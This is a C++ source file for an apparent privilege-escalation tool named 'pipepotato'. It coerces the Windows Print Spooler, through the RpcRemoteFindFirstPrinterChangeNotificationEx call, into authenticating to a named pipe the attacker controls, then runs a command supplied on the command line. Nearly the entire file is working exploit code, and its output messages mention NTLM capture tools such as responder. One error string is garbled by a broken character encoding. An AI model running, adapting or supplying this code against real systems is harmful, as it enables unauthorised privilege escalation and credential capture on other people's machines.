#include <stdio.h>
#include "spoolss_h.h"
#include <wchar.h>
#include "pipeserver.h"
#include <iostream>
#include <string>
#include <codecvt>


#pragma warning(disable : 4996)
#pragma comment(lib, "Rpcrt4.lib")
using namespace std;
string spoolHost;

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return (malloc(len));
}
void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);


}

void CallServerFuntions()
{

	printf("start to call");
	wstring targetServerStr = str2wstr("\\\\" + spoolHost + "\0");
	//wchar_t targetServer[] = str2wstr(targetServerStr);
	wstring captureServerStr = str2wstr("\\\\" + spoolHost + "/pipe/xxx\0");
	//wchar_t captureServer[] = L"\\\\172.16.99.7/pipe/xxx\0";
	PRINTER_HANDLE hPrinter = NULL;
	HRESULT hr = NULL;
	DEVMODE_CONTAINER devmodeContainer;
	SecureZeroMemory((char*)&(devmodeContainer), sizeof(DEVMODE_CONTAINER));
	hr = Proc1_RpcOpenPrinter((wchar_t*)targetServerStr.c_str(), &hPrinter, NULL, &devmodeContainer, 0);

	if (hr == ERROR_SUCCESS) {
		hr = Proc65_RpcRemoteFindFirstPrinterChangeNotificationEx(
			hPrinter,
			0x00000100 /* PRINTER_CHANGE_ADD_JOB */,
			0,
			(wchar_t*)captureServerStr.c_str(),
			0,
			NULL);

		if (hr != ERROR_SUCCESS) {
			if (hr == ERROR_ACCESS_DENIED) {
				wprintf(L"Target server attempted authentication and got an access denied.  If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.\n");
			}
			else if (hr == ERROR_INVALID_HANDLE) {
				wprintf(L"Attempted printer notification and received an invalid handle. The coerced authentication probably worked!\n");
			}
			else {
				wprintf(L"RpcRemoteFindFirstPrinterChangeNotificationEx failed.");
			}
		}

		Proc29_RpcClosePrinter(&hPrinter);
	}
	else
	{
		wprintf(L"RpcOpenPrinter failed %d\n", hr);
	}


}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("[-] Uasge: pipepotato.exe host cmd");
		exit(1);
	}
	spoolHost = argv[1];
	unsigned char* pszUuid = NULL;
	unsigned char pszProtocolSequence[] = "ncacn_np";
	unsigned char* pszNetworkAddress = NULL;
	unsigned char pszEndpoint[] = "\\pipe\\spoolss";
	unsigned char* pszOptions = NULL;
	unsigned char* pszStringBinding = NULL;

	HANDLE hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)regiesterPipe, argv[2], 0, NULL);


	RPC_STATUS rpcStatus = RpcStringBindingCompose(pszUuid,
		pszProtocolSequence,
		(unsigned char*)spoolHost.c_str(),
		pszEndpoint,
		pszOptions,
		&pszStringBinding);


	

	if (rpcStatus)
		exit(rpcStatus);

	rpcStatus = RpcBindingFromStringBinding(pszStringBinding,
		&DefaultIfName_IfHandle);
	if (rpcStatus)
		exit(rpcStatus);

	RpcTryExcept
	{
		CallServerFuntions();
	}
		RpcExcept(1)
	{
		unsigned long ulCode = RpcExceptionCode();
		printf("Å×³öÒì³£0x%lx = %ld¡£\n", ulCode, ulCode);
	}
	RpcEndExcept

		rpcStatus = RpcStringFree(&pszStringBinding);
	if (rpcStatus)
		exit(rpcStatus);

	rpcStatus = RpcBindingFree(&DefaultIfName_IfHandle);
	if (rpcStatus)
		exit(rpcStatus);
	return 0;

}